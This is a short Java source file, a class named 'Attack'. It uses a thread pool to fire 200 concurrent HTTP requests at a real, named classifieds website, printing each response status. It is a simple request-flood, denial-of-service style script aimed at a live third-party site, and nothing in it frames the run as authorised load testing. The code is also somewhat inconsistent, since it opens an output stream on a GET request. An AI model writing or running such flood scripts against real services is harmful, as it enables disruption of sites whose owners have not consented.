package com.company;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;


public class Attack {
    public static void main(String[] args) throws IOException {
        ExecutorService executorService = new ThreadPoolExecutor(100, 300, 100, TimeUnit.MILLISECONDS, new ArrayBlockingQueue<>(100));


        for(int i = 0; i < 200; i++) {
            executorService.submit(() -> {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    URL url = new URL("https://www.list.am/");
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();

                    con.setRequestMethod("GET");
                    con.setDoOutput(true);
                    DataOutputStream out = new DataOutputStream(con.getOutputStream());
                    int status = con.getResponseCode();
                    System.out.println(status);

                    if (status > 299) {
                        System.out.println("Not Ok");
                    } else {
                        System.out.println("Ok");
                    }

                    out.flush();
                    out.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
        }
    }
}
